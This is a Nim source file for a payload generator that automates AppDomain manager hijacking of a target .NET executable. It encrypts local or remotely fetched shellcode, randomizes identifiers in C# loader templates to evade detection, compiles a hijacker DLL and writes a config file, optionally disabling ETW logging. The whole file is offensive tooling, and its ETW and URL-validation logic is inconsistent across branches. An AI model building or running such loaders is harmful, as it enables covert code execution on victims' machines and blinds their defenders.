#[
    Main binary for automation of AppDomain hijack payloads.
]#

# Importing necessary modules from the standard library and external libraries.

import std/[os, uri, strformat, osproc, strutils, tables]  # os: for file and directory operations
                                                           # uri: for URI handling
                                                           # strformat: for string formatting
                                                           # osproc: for executing OS processes
                                                           # strutils: for string manipulation utilities
                                                           # tables: for using hash tables (dictionaries)

import mustache  # Importing the mustache library for templating
import therapist # Importing the therapist library, used for command line parsing
import ./crypto  # Importing a custom module named 'crypto' based on nimcrypto library for cryptographic operations

# Defining constants pointing to template mustache files by performing compile-time reading of the content of mustache template files so mustache files are embedded in compiled executable

const CONFIG = slurp("../templates/config.mustache")  # Loading configuration template from mustache file
const HIJACKER_EMBEDDED_PIC = slurp("../templates/hijacker-embedded-pic.mustache")  # Loading hijacker embedded position indepent code template from a mustache file
const HIJACKER_REMOTE_PIC = slurp("../templates/hijacker-remote-pic.mustache")  # Loading hijacker remote position indepent code template from a mustache file


# Creating a hash table (dictionary) named 'partials' which maps template names to their corresponding content

# This dictionary will facilitate the retrieval of template content using their respective keys

let partials = {
  "config": CONFIG,  # Adding the CONFIG template to the dictionary with the key "config"
  "hijacker-embedded-pic": HIJACKER_EMBEDDED_PIC,  # Adding the hijacker embedded position independent code template with the key "hijacker-embedded-pic"
  "hijacker-remote-pic": HIJACKER_REMOTE_PIC  # Adding the hijacker remote  position independent code template with the key "hijacker-remote-pic"
}.toTable()  # Converting the dictionary to a table


# The parser is specified as a tuple
let spec = (
    # Name is a positional argument, by virtue of being surrounded by < and >
    # name: newStringArg(@["<name>"], help="Person to greet"),
    target: newStringArg(@["-t", "--target-name"], required=true, help="Name of the target managed .exe to hijack."),
    hijackName: newStringArg(@["-n", "--hijack-name"], required=true, help="Name of the hijacker .dll."),
    shellcodeUrl: newStringArg(@["-u", "--url"], help="URL of the remote shellcode to run."),
    shellcodeFile: newStringArg(@["-f", "--file"], help="File containing the shellcode to embed."),
    outputDirectory: newDirArg(@["-o", "--output"], required=true, help="Full directory to write files to."),
    disableEtw: newBoolArg(@["-e", "--etw"], defaultVal=true, help="Disable ETW."),
    # --version will cause 0.1.0 to be printed
    version: newMessageArg(@["--version"], "1.0.0", help="Prints version."),
    # --help will cause a help message to be printed
    help: newHelpArg(@["-h", "--help"], help="Show help message."),
)
# `args` and `command` are included in tests but would normally be picked up from the commandline

# This block of code will only execute if the current module is the main program being run,
# rather than being imported as a library in another module.

when isMainModule:
    # This line calls the `parseOrQuit` procedure on the `spec` object.
    # It is typically used to parse command-line arguments or configuration,
    # and will terminate the program with a usage message if parsing fails or if
    # help/version information is requested by the user.
    spec.parseOrQuit()

    # If a help message or version was requested or a parse error generated it would be printed
    # and then the parser would call `quit`. Getting past `parseOrQuit` implies we're ok.
    # `spec` has now been modified to reflect the supplied arguments.

    # validate the target param contains an exe extension
    var (_, targetName, targetExt) = spec.target.value.splitFile()
    if targetExt == "": targetExt = "exe"
    let target = targetName.addFileExt(targetExt)

    # validate the hijack param contains a dll extension
    var (_, hijackName, hijackExt) = spec.hijackName.value.splitFile()
    if hijackExt == "": hijackExt = "dll"
    let hijack = hijackName.addFileExt(hijackExt)

    # Check if neither 'shellcodeFile' nor 'shellcodeUrl' options have been provided by the user.
    if not spec.shellcodeFile.seen and not spec.shellcodeUrl.seen:
        # If both 'shellcodeFile' and 'shellcodeUrl' are missing, inform the user that one of them is required.
        echo "Shellcode file or url required!"
        # Print an additional message indicating that the program will exit.
        echo "exiting..."
        # Terminate the program because the required input was not provided.
        quit()
    
    # Check if both 'shellcodeFile' and 'shellcodeUrl' options have been provided by the user.
    if spec.shellcodeFile.seen and spec.shellcodeUrl.seen:
        # If both 'shellcodeFile' and 'shellcodeUrl' are specified, inform the user that only one should be provided.
        echo "Cannot specify both shellcode file and url, pick one!"
        # Print an additional message indicating that the program will exit.
        echo "exiting..."
        # Terminate the program because specifying both options is not allowed.
        quit()

    # Check if the 'shellcodeFile' option has been provided by the user.
    if spec.shellcodeFile.seen:
        # Handle the embedded shellcode case here.

        # Check if the specified shellcode file exists.
        if not fileExists(spec.shellcodeFile.value):
            # If the file does not exist, inform the user.
            echo "Shellcode file does not exist!"
            # Print an additional message indicating that the program will exit.
            echo "exiting..."
            # Terminate the program because the specified shellcode file is not found.
            quit()
        
        # Attempt to validate the provided URI specified by the 'shellcodeUrl' option.
        try:
            # Parse the URI provided by the user.
            # The `parseUri` function attempts to parse the URI string and returns a Uri object.
            # The 'discard' keyword is used here to discard the result, as we are only interested in validating the URI format.
            discard spec.shellcodeUrl.value.parseUri()

        # If an exception occurs during URI parsing...
        except Exception as e:
            # Output the error message associated with the exception.
            echo e.msg
            # Exit the program because the URI provided is invalid.
            quit()
        
        # Generate a random string of 32 characters to be used as the encryption key.
        let key = crypto.randString(32)

        # Generate a random string of 16 characters to be used as the initialization vector (IV).
        let ivstring = crypto.randString(16)

        # Cast the address of the first byte of the IV string to a pointer to an array of 16 bytes.
        # This is done to obtain a pointer to the memory location of the IV string, which will be used
        # as the initialization vector in cryptographic operations.
        let iv = cast[ptr array[16, byte]](addr ivstring[0])[]

        # Open the shellcode file specified by the user for reading.
        let fShellcode = open(spec.shellcodeFile.value)

        # Read the contents of the shellcode file into a sequence of bytes.
        let bShellcode = cast[seq[byte]](fShellcode.readAll())

        # Encrypt the shellcode bytes using the provided encryption key and initialization vector (IV).
        # The 'encryptBytes' method encrypts the bytes using the specified key and IV.
        # The result is converted to a base64-encoded string using the 'encode' method.
        let encShellcode = bShellcode.encryptBytes(key, iv).encode()

        # Close the shellcode file after reading and encryption.
        fShellcode.close()
        
        # Open the configuration file for writing.
        # The configuration file name is derived from the target name and has the ".config" extension.
        let fConfig = open(spec.outputDirectory.value / (target & ".config"), fmWrite)

        # Construct the filename for the hijack.cs file.
        # The hijack.cs filename is derived from the hijackName with the ".cs" extension.
        let hijackFileName = hijackName & ".cs"

        # Open the hijack.cs file for writing.
        let fHijackCs = open(spec.outputDirectory.value / hijackFileName, fmWrite)

        # Create a new context for template processing.

        var c = newContext()

        # Search the 'partials' table (ln. 29) for template content that contains partial templates
        # that will be used to render the final templates that maps template names to their corresponding content
        # Searching the 'partials' table makes these partial templates available for use during template rendering.

        c.searchTable(partials)

        # Set variables in the context for template rendering.
        c["managerType"] = hijackName     # Assign the value of 'hijackName' to the 'managerType' variable in the context.
        c["encShellcode"] = encShellcode  # Assign the encrypted shellcode to the 'encShellcode' variable in the context.
        c["key"] = key                    # Assign the encryption key to the 'key' variable in the context.
        c["ivstring"] = ivstring          # Assign the IV string to the 'ivstring' variable in the context.

        # Assign randomized values to variables, functions, and class names in the context
        c["class_Helper"] = randName()
        c["func_Run"] = randName()
        c["var_shellcodeString"] = randName()
        c["func_DecryptString"] = randName()
        c["var_codeBytes"] = randName()
        c["var_codeSize"] = randName()
        c["var_threadHandle"] = randName()
        c["var_ivstring"] = randName()
        c["var_ivarray"] = randName()
        c["var_keystring"] = randName()
        c["var_encryptionKey"] = randName()
        c["func_Decrypt"] = randName()
        c["var_encryptedText"] = randName()
        c["var_encryptedBytes"] = randName()
        c["func_DecryptBytes"] = randName()
        c["var_decryptor"] = randName()
        c["var_memoryStream"] = randName()
        c["var_cryptoStream"] = randName()
        c["var_decryptedBytes"] = randName()
        c["var_bytesRead"] = randName()
        c["var_input"] = randName()
        c["func_GetKeyFromString"] = randName()
        c["var_codePtr"] = randName()
        c["class_StringEncryption"] = randName()
        c["class_NativeMethods"] = randName()



        # Write the rendered content of the "hijacker-embedded-pic" template to the hijack.cs file.
        fHijackCs.write("{{ >hijacker-embedded-pic }}".render(c))

        # Close the hijack.cs file after writing.
        fHijackCs.close()


        # Compile the C# source code into a DLL

        # Define a variable to store the result of the compilation command
        var result: tuple[output: string, exitCode: int]

        # Define the compilation command as a string ; Pending address reliability issue: If csc.exe does not exist in this path it won't compile
        let compileCmd = &"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:{spec.outputDirectory.value / hijack} {spec.outputDirectory.value / hijackFileName}"""

        # Execute the compilation command and store the result
        result = execCmdEx(compileCmd)

        # Check if the compilation was successful (exit code 0)
        if result.exitCode != 0:
            # If compilation failed, display error messages and exit
            echo "Compilation of hijacker CS failed!"
            echo "Command: ", compileCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()
        
        # Get the full assembly name with version and signing key token (if any)

        # Define the PowerShell command to retrieve the full assembly name
        var pwshCmd = &"""powershell -c "$path = Join-Path (Get-Item {spec.outputDirectory.value}).Fullname '{hijack}';([system.reflection.assembly]::loadfile($path)).FullName" """

        # Print the shell command being executed
        echo "Running shell command: ", pwshCmd

        # Execute the PowerShell command and store the result
        result = execCmdEx(pwshCmd)

        # Check if the PowerShell command was successful (exit code 0)
        if result.exitCode != 0:
            # If the PowerShell command failed, display error messages and exit
            echo "Powershell to get the assembly name failed!"
            echo "Command: ", pwshCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()

        # Write the configuration

        # Create a new context for template rendering
        c = newContext()

        # Search the 'partials' table for template content
        c.searchTable(partials)

        # Set variables in the context for template rendering
        c["managerAssemblyFullName"] = result.output.replace("\n", "")  # Set the full assembly name in the context
        c["managerType"] = hijackName  # Set the manager type in the context

        # Set 'etwEnabled' based on whether ETW is disabled or not
        if spec.disableEtw.value:
            c["etwEnabled"] = "false"  # If ETW is disabled, set 'etwEnabled' to "false"
        else:
            c["etwEnabled"] = "true"   # Otherwise, set 'etwEnabled' to "true"

        # Render the configuration template and write it to the config file
        fConfig.write("{{ >config }}".render(c))

        # Close the config file after writing
        fConfig.close()

    # If the 'shellcodeUrl' option is provided:
    elif spec.shellcodeUrl.seen:
        # Handle the remote URL shellcode option

        # Try to validate the URI
        try:
            # Parse the URI provided by the user
            # The `parseUri` function attempts to parse the URI string and returns a Uri object
            # The 'discard' keyword is used here to discard the result, as we are only interested in validating the URI format
            discard spec.shellcodeUrl.value.parseUri()

        # If an exception occurs during URI parsing...
        except Exception as e:
            # Output the error message associated with the exception
            echo e.msg
            # Exit the program because the URI provided is invalid
            quit()
        
        # Open the configuration file for writing.
        # The configuration file name is derived from the target name with a ".config" extension.
        let fConfig = open(spec.outputDirectory.value / (target & ".config"), fmWrite)

        # Construct the filename for the hijack.cs file.
        # The hijack.cs filename is derived from the hijackName with a ".cs" extension.
        let hijackFileName = hijackName & ".cs"

        # Open the hijack.cs file for writing.
        let fHijackCs = open(spec.outputDirectory.value / (hijackFileName), fmWrite)

        # Generate a random encryption key of length 32.
        let key = crypto.randString(32)

        # Generate a random initialization vector (IV) string of length 16.
        let ivstring = crypto.randString(16)

        # Cast the address of the first byte of the IV string to a pointer to an array of 16 bytes.
        # This obtains a pointer to the memory location of the IV string, which will be used as the IV in cryptographic operations.
        let iv = cast[ptr array[16, byte]](addr ivstring[0])[]

        # Convert the shellcode URL to a byte sequence, encrypt it using the generated key and IV, and then encode it as a base64 string.
        let encUrl = toByteSeq(spec.shellcodeUrl.value).encryptBytes(key, iv).encode()

        # Begin template work
        var c = newContext()
        c.searchTable(partials)        
        # Our vars
        c["managerType"] = hijackName
        c["encUrl"] = encUrl
        c["key"] = key
        c["ivstring"] = ivstring
        # Randomized var, func, and class names
        c["class_Helper"] = randName()
        c["func_Run"] = randName()
        c["var_codeUrl"] = randName()
        c["func_DecryptString"] = randName()
        c["var_codeBytes"] = randName()
        c["var_codeSize"] = randName()
        c["var_threadHandle"] = randName()
        c["func_DownloadData"] = randName()
        c["var_url"] = randName()
        c["var_client"] = randName()
        c["var_ivstring"] = randName()
        c["var_ivarray"] = randName()
        c["var_keystring"] = randName()
        c["var_encryptionKey"] = randName()
        c["func_DecryptString"] = randName()
        c["var_encryptedText"] = randName()
        c["var_encryptedBytes"] = randName()
        c["func_DecryptStringFromBytes"] = randName()
        c["var_decryptor"] = randName()
        c["var_memoryStream"] = randName()
        c["var_cryptoStream"] = randName()
        c["var_decryptedBytes"] = randName()
        c["var_bytesRead"] = randName()
        c["var_input"] = randName()
        c["func_GetKeyFromString"] = randName()
        c["var_codePtr"] = randName()
        c["class_StringEncryption"] = randName()
        c["class_NativeMethods"] = randName()

        # Write the rendered content of the "hijacker-remote-pic" template to the hijack.cs file.
        fHijackCs.write("{{ >hijacker-remote-pic }}".render(c))

        # Close the hijack.cs file after writing.
        fHijackCs.close()

        # Compile the C#

        # Define a variable to store the result of the compilation command
        var result: tuple[output: string, exitCode: int]

        # Define the compilation command as a string
        let compileCmd = &"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:{spec.outputDirectory.value / hijack} {spec.outputDirectory.value / hijackFileName}"""

        # Execute the compilation command and store the result
        result = execCmdEx(compileCmd)

        # Check if the compilation was successful (exit code 0)
        if result.exitCode != 0:
            # If compilation failed, display error messages and exit
            echo "Compilation of hijacker CS failed!"
            echo "Command: ", compileCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()

        # Output the compilation command and result
        echo compileCmd
        echo result

        # Get the full assembly name with version and signing key token (if any)

        # Define the PowerShell command to retrieve the full assembly name
        var pwshCmd = &"""powershell -c "$path = Join-Path (Get-Item {spec.outputDirectory.value}).Fullname '{hijack}';([system.reflection.assembly]::loadfile($path)).FullName" """

        # Print the shell command being executed
        echo "Running shell command: ", pwshCmd

        # Execute the PowerShell command and store the result
        result = execCmdEx(pwshCmd)

        # Check if the PowerShell command was successful (exit code 0)
        if result.exitCode != 0:
            # If the PowerShell command failed, display error messages and exit
            echo "Powershell to get the assembly name failed!"
            echo "Command: ", pwshCmd
            echo "Output:\n", result.output
            echo "Exiting..."
            quit()

        # Output the PowerShell command and result
        echo pwshCmd  # Print the PowerShell command that was executed
        echo result   # Print the result of executing the PowerShell command

        # Write the configuration

        # Create a new context for template rendering
        c = newContext()

        # Search the 'partials' table for template content
        c.searchTable(partials)

        # Set variables in the context for template rendering
        c["managerAssemblyFullName"] = result.output.replace("\n", "")  # Set the full assembly name in the context
        c["managerType"] = hijackName                                   # Set the manager type in the context

        # Set 'etwEnabled' based on whether ETW is disabled or not
        if spec.disableEtw.value:
            c["etwEnabled"] = "true"   # If ETW is disabled, set 'etwEnabled' to "true"
        else:
            c["etwEnabled"] = "false"  # Otherwise, set 'etwEnabled' to "false"

        # Render the configuration template and write it to the config file
        fConfig.write("{{ >config }}".render(c))

        # Close the config file after writing
        fConfig.close()
